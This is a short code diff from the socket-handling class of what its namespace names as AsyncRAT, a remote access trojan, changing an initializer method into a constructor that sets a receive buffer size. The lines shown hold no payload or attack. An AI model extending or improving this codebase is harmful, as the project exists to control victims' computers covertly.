@@ -20,7 +20,7 @@ namespace AsyncRAT_Sharp.Sockets
         public event ReadEventHandler Read;
         public delegate void ReadEventHandler(Clients client, byte[] data);
 
-        public void InitializeClient(Socket CLIENT)
+        public Clients(Socket CLIENT)
         {
             Client = CLIENT;
             Client.ReceiveBufferSize = 50 * 1024;
